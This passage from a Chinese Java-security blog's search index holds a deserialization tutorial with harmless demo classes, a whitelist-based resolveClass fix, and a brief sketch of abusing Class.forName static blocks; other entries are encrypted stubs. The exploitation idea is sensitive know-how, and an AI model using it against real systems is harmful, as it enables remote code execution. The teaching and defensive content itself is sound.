class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setName(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220829162019434.png" alt="image-20220829162019434"></p><p>运行后，除了正常对类对象的序列化与反序列化之外，还执行了我们重写的<code>writeObject</code>方法里的命令执行代码。</p><p>这也是反序列化漏洞的成因，如果输入的反序列化数据可以被用户控制，那么攻击者就可以构造恶意的 payload 执行系统命令。</p><h3 id="java-io-Externalizable"><a href="#java-io-Externalizable" class="headerlink" title="java.io.Externalizable"></a>java.io.Externalizable</h3><p><code>java.io.Externalizable</code>和<code>java.io.Serializable</code>几乎一样，只是<code>java.io.Externalizable</code>接口定义了<code>writeExternal</code>和<code>readExternal</code>方法需要序列化和反序列化的类实现，其余则和<code>java.io.Serializable</code>一样。</p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span>  <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>主类<code>Main</code>和前面一样保持不变<br><img src="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220829170100690.png" alt="image-20220829170100690"></p><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><p>实现了<code>java.io.Serializable</code>接口的类，可以定义如下方法（反序列化魔术方法），这些方法将会在类序列化或反序列化过程中进行调用：</p><ul><li><code>private void writeObject(ObjectOutputStream out)</code>，自定义序列化</li><li><code>private void readObject(ObjectInputStream in)</code>，自定义反序列化</li><li><code>private void readObjectNoData()</code></li><li><code>protected Object writeReplace()</code></li><li><code>protected Object readResolve()</code></li></ul><p>有些方法在前面已经了解和使用过，说说<code>writeReplace()</code>和<code>readResolve()</code>方法</p><p><code>writeReplace()</code>：返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p><p><code>readResolve()</code>：返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p><p><strong>代码示例：</strong></p><p>创建<code>User</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 11:49</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = <span class="string">&quot;dotast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建<code>Admin</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 17:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Admin</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建主类<code>Main</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/8/29 15:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        m.serialize();</span><br><span class="line">        m.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Admin</span>();</span><br><span class="line">        <span class="comment">// 通过writeObject方法将类对象进行序列化</span></span><br><span class="line">        out.writeObject(admin);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize success!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) in.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize success!&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;The name is：&quot;</span>+user.getName());</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><img src="/2021/09/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220829180709106.png" alt="image-20220829180709106"></p><p>可以看到，在进行序列化的时候，本来序列化的是<code>Admin</code>类，由于<code>writeReplace()</code>方法的存在变成了序列化<code>User</code>类；而<code>User</code>类中定义的<code>name</code>为变量的值为<code>dotast</code>，在进行反序列化的时候，由于<code>readResolve()</code>方法的存在，<code>name</code>变量的值替换成了<code>admin</code>。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英语语法</title>
      <link href="/2021/09/21/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/09/21/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6acc6678695414bea6c5a5fb234fd65e3ed6783b9dd55444c01dd80214364f34">f3cf9691fdf9b4e3a5779409e8d0ddc07faf4e97120846c8a0057e939e8aa60dd8c028df6af3240cffb0414d1a3fc035d57b1975a278642a1cd4d1078408ef24745feae511643fa5d6fc200c22eed19843454473be201621e5a89b34ff565711cb58caf8c49d4ecfde16c50de490166a76d891dbc870ff65fa82a975227b22415fb353ebfe572423e34800b3cc57527e129625ccce241d93c09c3066070c1ceb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 英语语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java fix序列化漏洞</title>
      <link href="/2021/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/09/10/java-fix%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="java-fix序列化漏洞"><a href="#java-fix序列化漏洞" class="headerlink" title="java fix序列化漏洞"></a>java fix序列化漏洞</h1><p>重点看了看java序列化的fix的操作，于是就简单的记录一下。</p><p><a href="https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md">github上有一篇文章写的比较全</a>这里自己只是实现其中的一个方法，而该方法也是<a href="https://github.com/ikkisoft/SerialKiller">SerialKiller</a>项目的底层原理。</p><h4 id="hook-ObjectInputStream类的resolveClass方法"><a href="#hook-ObjectInputStream类的resolveClass方法" class="headerlink" title="hook ObjectInputStream类的resolveClass方法"></a>hook ObjectInputStream类的resolveClass方法</h4><blockquote><p>需要继承Java.io.ObjectInputStream实现一个子类，在子类中重写resolveClass方法，以实现在其中通过判断类名来过滤危险类。然后在JavaSerializer类中使用这个子类来读取序列化数据，从而修复漏洞。</p></blockquote><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HookObjectInputStream</span><span class="params">(InputStream inputStream)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化xlh.serialVersionUID.Address.class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(xlh.serialVersionUID.Address.class.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    <span class="string">&quot;Unauthorized deserialization attempt&quot;</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> xlh.fix.HookResolveClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> xlh.serialVersionUID.Address;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d:\\address.ser&quot;</span>);<span class="comment">//这样的话cc6.ser就不能使用了。</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HookObjectInputStream</span>(fin);</span><br><span class="line">            <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> (Address) ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            System.out.println(address);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他利用fix思路不过多介绍。</p><p>突然想到了国赛java题的修复方案，是通过修改关键类中的serialVersionUID，<a href="https://www.cnblogs.com/xuxinstyle/p/11394358.html">serialVersionUID</a>可以理解为java序列化的标识。只有满足序列化后的serialVersionUID值和序列化前的值一样才可以成功反序列化。不然会报错<strong>InvalidClassException</strong></p><p><a href="http://www.code2sec.com/ji-yi-ci-javafan-xu-lie-hua-lou-dong-de-fa-xian-he-xiu-fu.html">一篇好文章</a></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>介绍了fix，然后在介绍一下漏洞挖掘的思路，只是自己的思路。。。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一个类被加载到jvm中，是还没有进行初始化的，通常情况下可以通过<span class="keyword">new</span>、newInstance、Class.forName等方法来初始化。同时在初始化的过程中会调用类的静态方法/属性或者构造函数。所以经常有见到类写成如下形式：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">这种时候通过Class.forName再初始化类的时候，jvm会自动调用其中的静态代码块，并输出。</span><br></pre></td></tr></table></figure><p>所以如果我们能控制<strong>Class.forName</strong>的值，并且我们重写一个恶意的静态方法就能够成功利用（这里和p师傅文章中的java安全慢谈一样）。</p><p>对于new、newInstance进行初始化类的时候会调用其无参的构造函数。至于利用思路，师傅们可以自己去思考。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">instance</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    instance()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">instance</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">instance</span>();</span><br><span class="line"><span class="comment">//        instance.class.newInstance();</span></span><br><span class="line"><span class="comment">//        Class.forName(&quot;instance&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化编码绕过</title>
      <link href="/2021/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/"/>
      <url>/2021/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7826a7d81c5f1f7804de8a95b0f2b4456e20d4f8125c9de22fc15db22964f0b8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">听说只有管理员才可以查看哦</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞利用-基础</title>
      <link href="/2021/01/23/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E5%9F%BA%E7%A1%80/"/>
      <url>/2021/01/23/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="288db6bf13a41ae9c4e597ed93a7e3cad8ac602c370d69c184e13a732333e54e">f3cf9691fdf9b4e3a5779409e8d0ddc01af1bb920ac3dc04d31d5769f8a47161</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请联系管理员获取密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞银行赏金之路</title>
      <link href="/2021/01/21/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E8%B5%8F%E9%87%91%E4%B9%8B%E8%B7%AF/"/>
      <url>/2021/01/21/%E6%BC%8F%E6%B4%9E%E9%93%B6%E8%A1%8C%E8%B5%8F%E9%87%91%E4%B9%8B%E8%B7%AF/</url>
      
